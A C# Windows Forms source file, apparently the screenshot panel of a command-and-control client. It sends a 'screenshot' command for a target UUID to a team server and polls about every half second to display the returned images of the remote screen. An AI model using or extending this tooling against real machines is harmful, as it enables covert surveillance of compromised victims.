using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace C2_Client_Ui
{
    public partial class Screenshot : Form
    {

        private TeamApi api = new TeamApi();
        private AddMsgtype addMsgtype = new AddMsgtype();
        //private AddMsgtype addMsgtype =new AddMsgtype();
        public Screenshot(string uuid123, string address, string jwt, string username)
        {

            addMsgtype.Jwttoken = jwt;
            addMsgtype.Uuid = uuid123;
            addMsgtype.Username = username;
            addMsgtype.Address = address;
            InitializeComponent();
        }

        private void Screenshot_Load(object sender, EventArgs e)
        {
            
            this.Text = "Screenshot:" + addMsgtype.Uuid;
        
            this.pictureBox_screenshot.BackgroundImageLayout = ImageLayout.Stretch;
            this.pictureBox_screenshot.SizeMode = PictureBoxSizeMode.StretchImage;

        }
        public void Getimg() {
  
            string s= api.Getscreenshot(addMsgtype);
            if (s == "")
            {
                timer_MainForm.Enabled = false;
                timer_MainForm.Stop();
                MessageBox.Show("截图失败.");
                // button_end.MouseClick == true;
               
            }
            else {
                s = s.Replace("data:image/jpeg;base64,", "");
                Bitmap b = ToImage(s);
                this.pictureBox_screenshot.Image = b;
            }
       
           // MessageBox.Show(s);
           
            
        }
        /// <summary>
        /// 将Base64字符串转换为图片
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private Bitmap ToImage(string base64str)
        {
            //string base64 = this.richTextBox.Text;
            byte[] arr = Convert.FromBase64String(base64str);
            MemoryStream ms = new MemoryStream(arr);
            Bitmap bmp = new Bitmap(ms);
            //this.pictureBox_screenshot.Image = bmp;
            return bmp;
        }

        private void timer_MainForm_Tick(object sender, EventArgs e)
        {
            DemoAsync();
            addMsgtype.Cmdtype = "screenshot"; //截图请求
            //MessageBox.Show(addMsgtype.ToString()); ;
            api.AddCmdType(addMsgtype);
        }

        private void button_start_Click(object sender, EventArgs e)
        {
            timer_MainForm.Enabled = true;

            timer_MainForm.Interval = 500;  //定时器时间间隔

            timer_MainForm.Start();   //定时器开始工作
        }

        private void button_end_Click(object sender, EventArgs e)
        {
            timer_MainForm.Enabled = false;
            timer_MainForm.Stop();
            api.Delscreenshot(addMsgtype);
        }

        private void Screenshot_FormClosing(object sender, FormClosingEventArgs e)
        {
            api.Delscreenshot(addMsgtype);
        }
        async Task DemoAsync()
        {
            //Thread.Sleep(2000); //毫秒
            //将后续代码交给线程池执行
            await Task.Run(() => { Thread.Sleep(3000); });
            string a = api.GetCmdstr(addMsgtype);
            Getimg();
            
        }
        private void button1_Click(object sender, EventArgs e)
        {
            DemoAsync();
            addMsgtype.Cmdtype = "screenshot"; //截图请求
            //MessageBox.Show(addMsgtype.ToString()); ;
            api.AddCmdType(addMsgtype);
            //Thread.Sleep(5000); //毫秒
            
        }
    }
}
